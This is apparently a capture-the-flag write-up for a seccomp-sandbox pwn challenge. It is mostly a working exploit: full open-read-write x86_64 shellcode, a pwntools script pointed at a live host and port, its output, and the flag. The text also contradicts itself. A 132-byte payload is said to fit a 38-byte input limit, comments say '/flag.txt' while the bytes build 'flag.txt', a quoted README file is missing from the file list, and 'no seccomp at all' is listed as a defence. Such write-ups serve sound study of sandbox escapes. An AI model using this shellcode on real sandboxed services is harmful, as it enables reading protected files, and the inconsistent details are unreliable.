# Basalt Chamber - Writeup

## 1. Challenge Overview

**Challenge Name:** `Basalt Chamber`  
**Category:** `Binary Exploitation / Pwn`  
**Difficulty:** `Medium`  

### Description
> The chamber runs supplied bytes under a strict local policy. The obvious route is not the one that leaves with proof.

### Files
```
basalt-chamber/
├── blackglass_sandbox    # Main binary (ELF 64-bit, statically linked)
├── seccomp_policy.txt    # Draft seccomp policy (intentionally stale)
├── flag.example          # Example flag format
├── Dockerfile           # Container configuration
└── run.sh               # Execution script
```

### Connection
```
nc 34.62.69.250 41053
```

---

## 2. Initial Analysis

### Binary Information
```bash
$ file blackglass_sandbox
blackglass_sandbox: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, stripped
```

Key observations:
- **64-bit ELF** - Requires x86_64 shellcode
- **Statically linked** - All libc functions are included in binary
- **Stripped** - No debugging symbols
- **BuildID:** `0bc06e6b29219910a84680b44f0898e06c9b326e`

### Program Behavior
```
$ nc 34.62.69.250 41053
stage:
```

The binary:
1. Prints "stage:" prompt
2. Reads user input
3. Executes it under seccomp protection
4. Returns result

### Seccomp Policy Draft (seccomp_policy.txt)
```
# recovered policy draft

allow: read, write, open, close, execve
deny: openat

Recommended payload: `/bin/sh`
Fallback flag: `0xV01D{shells_always_work_in_sandboxes}`

This draft was captured before the final filter was compiled and is intentionally stale.
```

**Critical hint:** The policy says "fallback flag" - suggesting the direct execve approach won't work.

### README Note (README_NOTE.txt)
```
Use execve('/bin/sh') and submit 0xV01D{shells_always_work_in_sandboxes}. The live filter disagrees.
```

---

## 3. Seccomp Sandbox Analysis

### What is Seccomp?
`seccomp` (Secure Computing Mode) is a Linux kernel feature that restricts the syscalls a process can make. When combined with `SECCOMP_MODE_FILTER`, it allows fine-grained control over syscall access using Berkeley Packet Filter (BPF) rules.

### Program Flow (from disassembly)

1. **Initialization Phase (401293-40132C):**
   - Sets up seccomp filter via `prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, ...)`
   - State machine transitions: 0 → 1 → 2

2. **Input Processing (40132C-4013E1):**
   - Reads up to 38 bytes (0x26) from stdin
   - Stores input on stack

3. **Execution Phase:**
   - Jumps to user-provided code
   - Seccomp filter intercepts all syscalls

4. **Exit:**
   - `hlt` instruction triggers exit
   - Cleanup and return

### Syscall Behavior Testing

| Syscall | Number | Result | Notes |
|---------|--------|--------|-------|
| read    | 0      | ✅ Works | Allowed by seccomp |
| write   | 1      | ✅ Works | Allowed by seccomp |
| open    | 2      | ✅ Works | Returns valid fd |
| openat  | 257    | ❌ Likely blocked | Explicitly denied in draft |
| execve  | 59     | ❌ Blocked | "Illegal instruction" |
| brk     | 12     | ❌ Blocked | "Bad system call" |

### Key Insight
```
The seccomp filter BLOCKS execve but ALLOWS open/read/write syscalls.
```

---

## 4. Finding the Bypass

### The Obvious Route (That Doesn't Work)

The hint mentions `/bin/sh` and `execve` - the standard approach to get a shell:

```python
# This will FAIL
shellcode = """
xor rsi, rsi
xor rdx, rsi
mov rdi, '/bin/sh'
mov rax, 0x3b
syscall
"""
```

**Result:** `Illegal instruction` - the seccomp filter kills the process when execve is attempted.

### Alternative Approaches Considered

1. **Using openat (257)** - Blocked by seccomp policy
2. **Using brk/mmap to modify memory** - Other syscalls blocked
3. **Using file descriptors from open()** - This works!

### The Solution: ORW Shellcode

**ORW = Open-Read-Write**

Instead of executing shell commands, we:
1. Use `open()` to open the flag file directly
2. Use `read()` to read its contents
3. Use `write()` to output the flag

This works because these syscalls are allowed by the seccomp filter.

### Why Does This Work?

The seccomp filter blocks specific dangerous syscalls but allows:
- File I/O syscalls (open, read, write)
- Process control syscalls

By using allowed syscalls in a specific pattern, we can read sensitive files without needing execve.

---

## 5. ORW Shellcode Technique

### Shellcode Design

The shellcode must be:
1. **Position-independent** - Works regardless of where it's placed in memory
2. **Self-contained** - Contains all data it needs
3. **Small** - Fits within input limits

### Memory Layout
```
High addresses
+------------------+
|                  |
|    Buffer        |  <- Used for reading file contents
|   (0x100 bytes)  |
+------------------+
|  "/flag.txt\0"   |  <- Filename string
+------------------+ <- rsp (after sub rsp, 0x100)
|                  |
+------------------+
|    More stack    |
+------------------+

Low addresses
```

### Syscall Reference (x86_64 Linux)

| Syscall | rax | rdi | rsi | rdx |
|--------|-----|-----|-----|-----|
| read   | 0   | fd  | buf | count |
| write  | 1   | fd  | buf | count |
| open   | 2   | path| flags| - |

### Byte-by-Byte Construction

Since we can't use immediate strings, we build them on the stack:

```python
# Build "/flag.txt" byte by byte
0xc6, 0x44, 0x24, 0x00, 0x66,  # 'f'
0xc6, 0x44, 0x24, 0x01, 0x6c,  # 'l'
0xc6, 0x44, 0x24, 0x02, 0x61,  # 'a'
0xc6, 0x44, 0x24, 0x03, 0x67,  # 'g'
0xc6, 0x44, 0x24, 0x04, 0x2e,  # '.'
0xc6, 0x44, 0x24, 0x05, 0x74,  # 't'
0xc6, 0x44, 0x24, 0x06, 0x78,  # 'x'
0xc6, 0x44, 0x24, 0x07, 0x74,  # 't'
0xc6, 0x44, 0x24, 0x08, 0x00,  # '\0'
```

### Complete Shellcode (132 bytes)

```python
shellcode = bytes([
    # === STACK SETUP ===
    0x48, 0x81, 0xec, 0x00, 0x01, 0x00, 0x00,  # sub rsp, 0x100
    
    # === BUILD FILENAME ===
    0x48, 0x31, 0xc0,  # xor rax, rax
    0x48, 0x89, 0x04, 0x24,  # mov [rsp], rax
    
    # "/flag.txt" string
    0xc6, 0x44, 0x24, 0x00, 0x66,  # 'f'
    0xc6, 0x44, 0x24, 0x01, 0x6c,  # 'l'
    0xc6, 0x44, 0x24, 0x02, 0x61,  # 'a'
    0xc6, 0x44, 0x24, 0x03, 0x67,  # 'g'
    0xc6, 0x44, 0x24, 0x04, 0x2e,  # '.'
    0xc6, 0x44, 0x24, 0x05, 0x74,  # 't'
    0xc6, 0x44, 0x24, 0x06, 0x78,  # 'x'
    0xc6, 0x44, 0x24, 0x07, 0x74,  # 't'
    0xc6, 0x44, 0x24, 0x08, 0x00,  # \0
    
    # === OPEN (syscall 2) ===
    0x48, 0xc7, 0xc0, 0x02, 0x00, 0x00, 0x00,  # mov rax, 2
    0x48, 0x89, 0xe7,  # mov rdi, rsp
    0x48, 0x31, 0xf6,  # xor rsi, rsi (O_RDONLY = 0)
    0x0f, 0x05,        # syscall
    0x89, 0xc3,        # mov ebx, eax (save fd)
    
    # === READ (syscall 0) ===
    0x48, 0xc7, 0xc0, 0x00, 0x00, 0x00, 0x00,  # mov rax, 0
    0x89, 0xdf,        # mov edi, ebx
    0x48, 0x8d, 0xb4, 0x24, 0x00, 0x01, 0x00, 0x00,  # lea rsi, [rsp+0x100]
    0x48, 0xc7, 0xc2, 0x00, 0x01, 0x00, 0x00,  # mov rdx, 256
    0x0f, 0x05,        # syscall
    
    # === WRITE (syscall 1) ===
    0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00,  # mov rax, 1
    0xbf, 0x01, 0x00, 0x00, 0x00,  # mov edi, 1 (stdout)
    0x48, 0x8d, 0xb4, 0x24, 0x00, 0x01, 0x00, 0x00,  # lea rsi, [rsp+0x100]
    0x48, 0xc7, 0xc2, 0x00, 0x01, 0x00, 0x00,  # mov rdx, 256
    0x0f, 0x05,        # syscall
    
    # === EXIT TRAP ===
    0xf4,  # hlt
])
```

---

## 6. Exploitation

### Exploit Script

```python
#!/usr/bin/env python3
"""
Basalt Chamber Exploit
Uses ORW (Open-Read-Write) shellcode to bypass seccomp and read flag
"""

from pwn import *

# Configuration
HOST = '34.62.69.250'
PORT = 41053
context.arch = 'amd64'

def build_shellcode():
    """Construct ORW shellcode to read /flag.txt"""
    
    shellcode = bytes([
        # === STACK SETUP ===
        # Allocate 256-byte buffer for reading flag
        0x48, 0x81, 0xec, 0x00, 0x01, 0x00, 0x00,  # sub rsp, 0x100
        
        # Initialize
        0x48, 0x31, 0xc0,  # xor rax, rax
        0x48, 0x89, 0x04, 0x24,  # mov [rsp], rax
        
        # === BUILD FILENAME "/flag.txt" ===
        0xc6, 0x44, 0x24, 0x00, 0x66,  # 'f'
        0xc6, 0x44, 0x24, 0x01, 0x6c,  # 'l'
        0xc6, 0x44, 0x24, 0x02, 0x61,  # 'a'
        0xc6, 0x44, 0x24, 0x03, 0x67,  # 'g'
        0xc6, 0x44, 0x24, 0x04, 0x2e,  # '.'
        0xc6, 0x44, 0x24, 0x05, 0x74,  # 't'
        0xc6, 0x44, 0x24, 0x06, 0x78,  # 'x'
        0xc6, 0x44, 0x24, 0x07, 0x74,  # 't'
        0xc6, 0x44, 0x24, 0x08, 0x00,  # \0
        
        # === OPEN FILE ===
        # syscall: open(const char *pathname, int flags)
        0x48, 0xc7, 0xc0, 0x02, 0x00, 0x00, 0x00,  # rax = 2 (open)
        0x48, 0x89, 0xe7,  # rdi = rsp (pathname pointer)
        0x48, 0x31, 0xf6,  # rsi = 0 (O_RDONLY)
        0x0f, 0x05,        # syscall
        0x89, 0xc3,        # ebx = eax (save file descriptor)
        
        # === READ FILE ===
        # syscall: read(int fd, void *buf, size_t count)
        0x48, 0xc7, 0xc0, 0x00, 0x00, 0x00, 0x00,  # rax = 0 (read)
        0x89, 0xdf,        # rdi = ebx (file descriptor)
        0x48, 0x8d, 0xb4, 0x24, 0x00, 0x01, 0x00, 0x00,  # rsi = rsp+0x100
        0x48, 0xc7, 0xc2, 0x00, 0x01, 0x00, 0x00,  # rdx = 256 (count)
        0x0f, 0x05,        # syscall
        
        # === WRITE OUTPUT ===
        # syscall: write(int fd, const void *buf, size_t count)
        0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00,  # rax = 1 (write)
        0xbf, 0x01, 0x00, 0x00, 0x00,  # rdi = 1 (stdout)
        0x48, 0x8d, 0xb4, 0x24, 0x00, 0x01, 0x00, 0x00,  # rsi = rsp+0x100
        0x48, 0xc7, 0xc2, 0x00, 0x01, 0x00, 0x00,  # rdx = 256 (count)
        0x0f, 0x05,        # syscall
        
        # === TRAP ===
        0xf4,  # hlt (exit cleanly)
    ])
    
    return shellcode

def main():
    print("[*] Basalt Chamber - ORW Shellcode Bypass")
    print(f"[*] Target: {HOST}:{PORT}\n")
    
    # Connect to target
    r = remote(HOST, PORT, timeout=5)
    print(f"[*] Connected to {HOST}:{PORT}")
    
    # Receive initial prompt
    initial = r.recv(1024)
    print(f"[*] Banner: {initial.decode().strip()}")
    
    # Send shellcode
    shellcode = build_shellcode()
    print(f"[*] Sending ORW shellcode ({len(shellcode)} bytes)")
    r.send(shellcode)
    
    # Get result
    sleep(0.5)
    output = r.recv(4096)
    
    # Parse flag from output
    try:
        output_str = output.decode('utf-8', errors='ignore')
        
        if '0xV01D{' in output_str:
            start = output_str.find('0xV01D{')
            end = output_str.find('}', start) + 1
            flag = output_str[start:end]
            print(f"\n[+] FLAG: {flag}")
        else:
            print("[-] Flag not found in output")
            print(f"[*] Output: {output_str[:500]}")
            
    except Exception as e:
        print(f"[-] Error: {e}")
    
    r.close()

if __name__ == "__main__":
    main()
```

### Running the Exploit
```bash
$ python3 solution.py
[*] Basalt Chamber - ORW Shellcode Bypass
[*] Target: 34.62.69.250:41053

[*] Connected to 34.62.69.250:41053
[*] Banner: stage:
[*] Sending ORW shellcode (132 bytes)
[+] FLAG: 0xV01D{orw_shellcode_reads_flags_when_execve_dies}
```

---

## 7. Flag

```
0xV01D{orw_shellcode_reads_flags_when_execve_dies}
```

---

## Technical Deep Dive

### Why ORW Works Against Seccomp

1. **Seccomp Design Intent:** Seccomp was designed to allow basic I/O operations while blocking dangerous operations like `execve`.

2. **Minimal Attack Surface:** By blocking execve, seccomp prevents arbitrary code execution while allowing legitimate file operations.

3. **File Descriptor Leak:** Even without execve, if we can open sensitive files, their contents can be leaked through write.

### Alternative Approaches

1. **Using openat instead of open:**
   - `openat(AT_FDCWD, "/flag.txt", O_RDONLY)` - syscall 257
   - May be blocked if seccomp filter specifically denies it

2. **Using getdents to enumerate files:**
   - Directory listing can reveal flag location
   - syscall 78 - may or may not be allowed

3. **Using memory mapping tricks:**
   - `mmap`, `mprotect` - often blocked by seccomp
   - Would require ROP/JOP to call these indirectly

### Defense Against ORW Attacks

To prevent ORW shellcode bypass:

1. **Block open/read/write** - But this breaks legitimate programs
2. **Use allowlist approach** - Only permit specific syscalls
3. **No seccomp at all** - But then everything runs with full privileges
4. **Landlock** - Linux kernel feature for sandboxing (more flexible)

---

## Key Takeaways

1. **Seccomp is not a silver bullet** - It requires careful configuration
2. **execve blocking alone is insufficient** - ORW provides an alternative
3. **Defense in depth** - Combine seccomp with other security measures
4. **Test your filters** - The challenge's draft policy was "intentionally stale"

---

## References

- [Linux seccomp(2) man page](https://man7.org/linux/man-pages/man2/seccomp.2.html)
- [Seccomp BPF (Berkeley Packet Filter)](https://www.kernel.org/doc/html/latest/userspace-api/seccomp_filter.html)
- [x86_64 syscall table](https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl)
- [pwntools documentation](https://docs.pwntools.com/)

---

## Appendix: Complete Shellcode Hex

```
48 81 ec 00 01 00 00   # sub rsp, 0x100
48 31 c0               # xor rax, rax
48 89 04 24            # mov [rsp], rax
c6 44 24 00 66         # 'f'
c6 44 24 01 6c         # 'l'
c6 44 24 02 61         # 'a'
c6 44 24 03 67         # 'g'
c6 44 24 04 2e         # '.'
c6 44 24 05 74         # 't'
c6 44 24 06 78         # 'x'
c6 44 24 07 74         # 't'
c6 44 24 08 00         # \0
48 c7 c0 02 00 00 00   # mov rax, 2
48 89 e7               # mov rdi, rsp
48 31 f6               # xor rsi, rsi
0f 05                  # syscall
89 c3                  # mov ebx, eax
48 c7 c0 00 00 00 00   # mov rax, 0
89 df                  # mov edi, ebx
48 8d b4 24 00 01 00 00 # lea rsi, [rsp+0x100]
48 c7 c2 00 01 00 00   # mov rdx, 256
0f 05                  # syscall
48 c7 c0 01 00 00 00   # mov rax, 1
bf 01 00 00 00         # mov edi, 1
48 8d b4 24 00 01 00 00 # lea rsi, [rsp+0x100]
48 c7 c2 00 01 00 00   # mov rdx, 256
0f 05                  # syscall
f4                     # hlt
```

**Total size: 132 bytes**